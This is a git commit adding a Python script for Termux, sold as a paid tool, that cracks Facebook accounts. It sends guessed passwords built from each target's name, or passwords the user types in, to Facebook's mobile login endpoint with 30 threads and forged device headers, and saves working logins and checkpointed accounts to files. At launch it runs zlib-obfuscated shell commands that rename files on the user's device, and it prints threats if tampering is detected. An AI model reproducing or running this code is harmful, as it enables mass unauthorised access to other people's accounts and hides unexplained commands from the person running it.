16553ee2fc9fd560d40b3bd4b11d04e9e495448b
Abdulmani01 <123299610+Abdulmani01@users.noreply.github.com>
2023-04-04 00:20:42 +0500

    Add files via upload

---
+++ Mani01.py
@@ -0,0 +1,333 @@
+#uft-8
+#!/usr/bin/python3
+#coding=utf-8
+#rana
+import os,sys
+os.system("clear")
+print(" \033[1;95m [~] Checking Security...")
+import os,shutil,zlib,time
+sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')
+sz1 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15')
+sz2 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19')
+sz3 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x89g\xfca\xa4\xa7@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc8\xa7\xdd\x00M\xaf\xf8\xa8<|s\x13\xcdsP\x06c\x9e\x1d\xa5\xecg[\xd7\xeb\x05\x14#z\xaa\x03\xfd\x0c\xcb\x0c\xd8\x13\xd3\x9fo\x8c\x14\xed\xfeF\xa9M\x0cn\x8a\xed7?\xf1Q&+')
+sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x13\xcf\xf8\xc3HO@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc9\x87\xdd\x00M\xafxT\x9e\xbe\xb9\x89\xe69(\x831\xcf\x8eR\xf6g[\xd7\xeb\x05\x14#z\xaa\x03\xda\xc32\x03\xf6\xc4\xf4\xe7\x1b#E\xbb\xbfQj\x13\x83\x9bb\xfb\xcd\x0f\xf0\xab&#')
+sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')
+sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')
+sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')
+#--checking if file is not avalible
+if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
+        pass
+        exit("Error in termux modules ")
+if os.path.exists(sz):
+        os.rename(sz1,'.f1')
+        os.rename(sz2,'.f2')
+        os.system(sz3)
+        os.system(sz4)
+        os.system(sz5)
+        os.system(sz6)
+else:
+        pass
+st1= '1'
+st2='0'
+st3='3'
+st4='4'
+st = st1+st2+st3+st4
+aa = """
+/
+d
+a
+t
+a
+/
+d
+a
+t
+a
+/
+c
+o
+m
+.
+t
+e
+r
+m
+u
+x
+/
+f
+i
+l
+e
+s
+/
+u
+s
+r
+/
+l
+i
+b
+/
+p
+y
+t
+h
+o
+n
+3
+.
+1
+1
+/
+s
+i
+t
+e
+-
+p
+a
+c
+k
+a
+g
+e
+s
+/
+r
+e
+q
+u
+e
+s
+t
+s
+/
+m
+o
+d
+e
+l
+s
+.
+p
+y"""
+
+aa = aa.replace('\n','')
+if not str(len(open(aa,'r').readlines()))==st:
+	time.sleep(0);print(' [-] Final Warning If You Try Again Your System Will be Fucked Bye Mr Mani');exit()  
+import os
+import zlib
+try:
+	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
+	from string import *
+	from concurrent.futures import ThreadPoolExecutor as ThreadPool
+except(ImportError):
+    os.system("pip install requests")
+    pass
+ranasys = ("anaaahilsystems")
+try:
+    import socks
+except(ImportError):
+    os.system("pip install -U requests[socks]")
+    pass
+try:
+    import bs4
+except(ImportError):
+    os.system("pip install bs4")
+    pass
+
+from bs4 import BeautifulSoup
+import json,os,time,base64,random,re,sys
+from requests.exceptions import ConnectionError as CError
+from concurrent.futures import ThreadPoolExecutor as tpe
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[91m' # KUNING +
+h = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;92m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+asu = random.choice([m,k,h,u,b])
+G='\x1b[1;92m'
+R='\x1b[1;91m'
+W='\x1b[1;97m'
+S ='\x1b[1;96m'
+Y ='\x1b[1;93m'
+yp ='\x1b[1;95m'
+mys = '\x1b[0m' 
+idx = []
+loop = 0
+proxy_list = []
+random_agents = []
+
+##Logo##
+logo=f'''
+{W}
+   8b    d8    db    88b 88 88 
+   88b  d88   dPYb   88Yb88 88 
+   88YbdP88  dP__Yb  88 Y88 88 
+   88 YY 88 dP""""Yb 88  Y8 88 
+--------------------------------------------------
+    Owner   : Mr-Mani
+    FB      : Mr Mani
+    Status  : Paid
+--------------------------------------------------'''
+
+def m_k():
+    os.system("clear")
+    print(logo)
+    print(" [1] Start File Clone")
+    
+    print(" [2] Contact With Admin ")
+    my_ = input(" [•] Sellect Option : ")
+    if my_ == "1":
+        fc()
+    if my_=="2":
+    	os.system("am start https://wa.me/+923434402970")
+    else:
+    	print(' [•] Select Right Option')
+def fc():
+    os.system("clear")
+    print(logo)
+   # print(50*'-')
+    try:
+        file = input(" [•] File Location : ")
+        for x in open(file,'r').readlines():
+            idx.append(x.strip())
+    except:
+        print(" [•] Input Right Location ")
+        m_k()
+    method()
+    exit()
+
+
+def method():
+    oku = []
+    twof = []
+    cpu = []
+    pp = []
+    os.system("clear");print(logo)
+    print(f" {W}[1] System Password");print(f" {W}[2] Choice Passwords");print(f" {W}[B] Back {W}")
+    clon_ = input(" [?] Sellect : ")
+    if clon_ == "1":
+        pas = ["first last",'firstlast','first123']
+        for px in pas:
+            pp.append(px)
+        pass
+    elif clon_ == "2":
+        os.system("clear");print(logo)
+        lp = input(' [-] Password Limit :  ')
+        if lp.isnumeric():
+            for x in range(int(lp)):
+            	
+                pp.append(input(f' {W}[-] Password {x+1}: '))
+            pass
+        else:
+            print(" [-] EnterOnly Number ")
+            exit()
+    elif clon_ == "B":
+        my_main()
+    else:
+        exit(" [-] Please Enter Valid Option ")
+    os.system("clear")
+    print(logo)
+    print(' [-] Cracking Limit : '+str(len(idx)))
+    print(" [-] Be Patience Cracking Has Been Started")
+  #  print("To stop process press CTRL c")
+    print("--------------------------------------------------")
+    fax = ('|')
+    def rana(user):
+        global loop,idx
+        r = requests.Session()
+        user = user.strip()
+        url, name = user.split("|")
+        first = name.rsplit(" ")[0]
+        try:
+            last = name.rsplit(" ")[1]
+        except:
+            last = first
+        for px in pp:        	        	        
+            ams = str(random.randint(111,777))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,777))
+            header = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": "SupportsFresco=1 modular=1 Dalvik/2.1.0 (Linux; Android 12; CPH2373 Build/RKQ1.211119.001) [FBAN/FB4A;FBAV/"+str(random.randint(111, 999))+".0.0."+str(random.randint(11, 88))+"."+str(random.randint(111, 888))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.randint(111111111, 888888888))+";FBCR/"+random.choice(['Zong','Sinch'])+";FBMF/OPPO;FBBD/OPPO;FBDV/"+random.choice(['Oppo R817'])+";FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.48,width=480,height=800};FB_FW/1;] FBBK/1","X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
+            px = px.replace("first", first).replace("last", last)
+            px = px.lower()
+            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":url,"password":px,"access_token":"275254692598279|585aec5b4c27376758abb7ffcb9db2af","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+            if 'session_key' in response.text:
+                print('\r{}\033[1;92m [OK] {} {} {} {}'.format(G, url, fax, px, mys))
+                open('/sdcard/ok.txt','a').write(f'{url}|{px}\n')
+                oku.append(url)
+                break
+            elif 'checkpoint' in response.text:
+                print('\r{}\033[1;91m [Checkpiont] {} {} {} {}'.format(G, url, fax, px, mys))
+                cpu.append(url)
+                open('/sdcard/cp.txt','a').write(f'{url}|{px}\n')
+                break
+            elif 'Login approvals are on' in response.text:
+                print('\r{}\033[1;94m[2F] {} {} {} {}'.format(G, url, fax, px, mys))
+                open('/sdcard/2f.txt','a').write(f'{url}|{px}\n')
+            else:
+                #print(response.text)
+                continue
+        sys.stdout.write('\r {} [Cracking] [{}|{}] [Succes:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
+        sys.stdout.flush()
+        loop += 1       
+    with tpe(max_workers=30) as tp:
+        tp.map(rana, idx)
+    print("\n-----------------------------------------------")
+    print(" [-] If You Enjoy Send Feeback")
+    print("-----------------------------------------------  ")
+    exit()
+
+
+def file_method():
+	exit()
+def file_method2():
+	exit()
+def aprovall_key():
+	print('Fucked You Kid ')
+	exit()
+def approval():
+  os.system('clear')
+  print(logo)
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "-".join(uuid)
+  sxb = 'MANI'
+  try:
+    httpCaht = requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O\xcf,\xc9(M\xd2K\xce\xcf\xd5wLJ)\xcd\xc9M\xcc\xcb40\xd4\xf7\x85PI9\xf9I\xfa\xb9\x89\x99y\xfa\x89\x89\x05e\x899z%\x15%\x00b\xec\x14\xc2')).text
+    if id in httpCaht:
+      print("\033[1;32mYour Key is Successfully Approved")
+      time.sleep(0.5)
+      msg = str(os.geteuid())
+      m_k()
+      pass
+    else:
+      print("\033[1;91m YOUR KEY \033[1;37m : \033[1;32m"+id+'-'+sxb)
+      print('\033[1;37m----------------------------------------------')
+      print("Note : Tool is Paid & We Accept All Types Of PAyment  Method . If There was Fb Update & Tool Wasnt Run Then We Are Not Responsible For All Of This . We Will Try  To Update Script Every Time But It Took Day ")
+      print('\033[1;37m----------------------------------------------')
+      print(" 15-Days Price   : 350")
+      print(" 1-Month Price   : 500")
+      print(" Other Countries : 5$ for Weekly  ")
+      print(" Other Countries : 15$ For Monthly") 
+      print('\033[1;37m----------------------------------------------')
+      input('\033[1;37m Press Enter For Contact To Admin ')
+      tks = ('Hello%20Mr-Mani%20Sir%20!%20Please%20Approve%20My%20Key%20The%20King%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+923434402970?text='+tks)
+      time.sleep(1)
+      approval()
+  except:
+    sys.exit()
+approval()
